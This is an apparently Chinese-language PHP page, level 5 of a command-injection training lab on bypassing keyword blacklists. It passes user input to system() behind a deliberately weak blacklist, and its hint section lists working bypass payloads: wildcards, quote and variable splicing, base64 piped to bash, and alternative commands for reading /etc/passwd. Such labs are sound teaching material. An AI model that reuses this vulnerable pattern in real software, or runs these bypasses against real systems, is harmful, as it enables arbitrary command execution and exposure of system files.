<?php
/**
 * Level 5: 关键字过滤绕过
 * 难度: ★★☆☆☆
 * 描述: 过滤了常用命令关键字，需要绕过
 * 目标: 使用通配符、命令替代等方式绕过关键字过滤
 */

$message = '';
$output = '';
$blocked = false;

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    // 关键字黑名单
    $blacklist = array('cat', 'more', 'less', 'head', 'tail', 'tac', 'nl', 'whoami', 'id');

    foreach ($blacklist as $bad) {
        if (stripos($cmd, $bad) !== false) {
            $blocked = true;
            $message = '<div class="error">❌ 检测到禁用命令: ' . htmlspecialchars($bad) . '</div>';
            break;
        }
    }

    if (!$blocked) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
        $message = '<div class="success">✅ 命令执行成功</div>';
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Level 5 - 关键字过滤绕过</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
        }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header .difficulty { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #667eea;
        }
        .info-box h3 { color: #333; margin-bottom: 10px; }
        .info-box ul, .info-box ol { margin-left: 20px; line-height: 1.8; color: #666; }
        .form-box {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background: #5568d3; }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #dc3545;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #ffc107;
        }
        .code-box {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box {
            background: #2d2d2d;
            color: #00ff00;
            border: 1px solid #444;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
        }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        table th, table td { padding: 10px; text-align: left; border: 1px solid #ddd; font-size: 13px; }
        table th { background: #f8f9fa; }
        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 5 - 关键字过滤绕过</h1>
            <div class="difficulty">难度: ★★☆☆☆ | 技巧: 通配符、命令替代、拼接</div>
        </div>

        <div class="content">
            <div class="info-box">
                <h3>📋 关卡说明</h3>
                <ul>
                    <li>服务器过滤了常用命令关键字</li>
                    <li>禁用命令: cat, more, less, head, tail, tac, nl, whoami, id</li>
                    <li>需要使用替代命令或绕过技巧</li>
                </ul>
            </div>

            <div class="info-box">
                <h3>💡 关键字绕过方法</h3>
                <table>
                    <tr>
                        <th style="width: 150px;">绕过方法</th>
                        <th style="width: 200px;">示例</th>
                        <th>说明</th>
                    </tr>
                    <tr>
                        <td>通配符 (*)</td>
                        <td><code>/bin/c*t /etc/passwd</code></td>
                        <td>* 匹配任意字符</td>
                    </tr>
                    <tr>
                        <td>通配符 (?)</td>
                        <td><code>/bin/ca? /etc/passwd</code></td>
                        <td>? 匹配单个字符</td>
                    </tr>
                    <tr>
                        <td>引号拼接</td>
                        <td><code>c""at /etc/passwd</code></td>
                        <td>空引号不影响执行</td>
                    </tr>
                    <tr>
                        <td>反斜杠</td>
                        <td><code>c\at /etc/passwd</code></td>
                        <td>转义字符也可拼接</td>
                    </tr>
                    <tr>
                        <td>变量拼接</td>
                        <td><code>a=c;b=at;$a$b /etc/passwd</code></td>
                        <td>通过变量组合命令</td>
                    </tr>
                    <tr>
                        <td>Base64编码</td>
                        <td><code>echo Y2F0 | base64 -d | bash</code></td>
                        <td>编码后解码执行</td>
                    </tr>
                    <tr>
                        <td>替代命令</td>
                        <td><code>strings /etc/passwd</code></td>
                        <td>使用功能类似的其他命令</td>
                    </tr>
                </table>
            </div>

            <div class="info-box">
                <h3>🎯 常用命令的替代方案</h3>
                <table>
                    <tr>
                        <th>原命令</th>
                        <th>替代方案</th>
                    </tr>
                    <tr>
                        <td>cat</td>
                        <td>strings, od, xxd, awk, sed, grep, sort, uniq</td>
                    </tr>
                    <tr>
                        <td>whoami</td>
                        <td>w, users, $USER, echo $USER</td>
                    </tr>
                    <tr>
                        <td>id</td>
                        <td>w, users, groups</td>
                    </tr>
                </table>
            </div>

            <?php echo $message; ?>

            <div class="form-box">
                <h3>命令执行测试</h3>
                <p style="margin-bottom: 10px; color: #dc3545; font-weight: bold;">
                    🚫 禁用命令: cat, more, less, head, tail, tac, nl, whoami, id
                </p>
                <form method="GET">
                    <label>输入命令:</label>
                    <input type="text" name="cmd" placeholder="/bin/c*t /etc/passwd" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" />
                    <input type="submit" value="执行命令" />
                </form>
            </div>

            <?php if ($output !== ''): ?>
            <div class="result-box">
                <h3 style="color: #00ff00; margin-bottom: 10px;">执行结果:</h3>
                <pre><?php echo htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></pre>
            </div>
            <?php endif; ?>

            <div class="hint">
                <strong>🔍 漏洞代码:</strong>
                <div class="code-box">$blacklist = array('cat', 'more', 'less', 'head', 'tail', 'tac', 'nl', 'whoami', 'id');

foreach ($blacklist as $bad) {
    if (stripos($cmd, $bad) !== false) {
        die("检测到禁用命令");
    }
}

system($cmd);  // ❌ 黑名单很容易被绕过</div>

                <p><strong>绕过方法1 - 使用通配符:</strong></p>
                <div class="code-box"># 星号通配符
?cmd=/bin/c*t /etc/passwd
?cmd=/???/c?? /etc/passwd

# 问号通配符
?cmd=/bin/ca? /etc/passwd</div>

                <p><strong>绕过方法2 - 使用引号拼接:</strong></p>
                <div class="code-box"># 空引号
?cmd=c""at /etc/passwd
?cmd=c''at /etc/passwd

# 反斜杠
?cmd=c\at /etc/passwd
?cmd=\c\a\t /etc/passwd</div>

                <p><strong>绕过方法3 - 使用变量拼接:</strong></p>
                <div class="code-box"># 变量拼接
?cmd=a=c;b=at;$a$b /etc/passwd

# 使用已有变量
?cmd=w  # 代替 whoami
?cmd=echo $USER  # 获取用户名</div>

                <p><strong>绕过方法4 - 使用替代命令:</strong></p>
                <div class="code-box"># 读取文件的替代命令
?cmd=strings /etc/passwd
?cmd=od -A n -t c /etc/passwd
?cmd=awk '{print}' /etc/passwd
?cmd=sed '' /etc/passwd
?cmd=grep '' /etc/passwd
?cmd=sort /etc/passwd

# whoami 的替代
?cmd=w
?cmd=users
?cmd=echo $USER</div>

                <p><strong>绕过方法5 - Base64编码:</strong></p>
                <div class="code-box"># 先编码命令
echo "cat /etc/passwd" | base64
# 输出: Y2F0IC9ldGMvcGFzc3dkCg==

# 然后执行
?cmd=echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash</div>

                <p><strong>尝试执行:</strong></p>
                <ul>
                    <li><code>/bin/c*t /etc/passwd</code> - 通配符绕过</li>
                    <li><code>c""at /etc/passwd</code> - 引号拼接</li>
                    <li><code>strings /etc/passwd</code> - 替代命令</li>
                    <li><code>w</code> - 查看用户（whoami替代）</li>
                    <li><code>grep '' /etc/passwd</code> - 使用grep读取</li>
                </ul>

                <p style="margin-top: 15px;"><strong>为什么黑名单无效:</strong></p>
                <ul>
                    <li>无法列举所有危险命令</li>
                    <li>有太多绕过方式</li>
                    <li>命令有很多等价替代</li>
                    <li>可以通过编码、拼接等方式绕过</li>
                </ul>
            </div>

            <a href="index.php" class="back-link">← 返回首页</a> |
            <a href="level4.php" class="back-link">← 上一关</a> |
            <a href="level6.php" class="back-link">下一关 →</a>
        </div>
    </div>
</body>
</html>
